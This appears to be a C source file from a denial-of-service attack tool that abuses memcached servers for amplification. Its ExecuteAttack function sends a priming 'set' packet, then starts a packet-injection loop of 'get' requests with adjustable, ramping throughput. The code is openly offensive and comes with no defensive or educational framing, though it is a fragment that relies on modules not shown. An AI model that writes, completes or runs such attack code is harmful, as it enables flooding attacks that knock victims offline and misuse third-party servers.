#include "manager.h"
#include "executor.h"
#include "common/common.h"
#include "injector/injector.h"


#define ERROR_MEMCACHED -1
#define STRIKE 0

int ExecuteAttack( AttackPlan * atkData )
{
  if( SendPacket(atkData->setPacket) < 0 )
  {
    ELOG(ERROR_MEMCACHED, "error memcached\n");
  }
   
  atkData->injectorId = CreateInjection( *atkData->getPacket, atkData->initialThroughput, atkData->timer, atkData->incFrequency, atkData->incThroughput );
  InjectionResume( atkData->injectorId );  
  
  //CloseSocket(sock);
  return STRIKE;
}

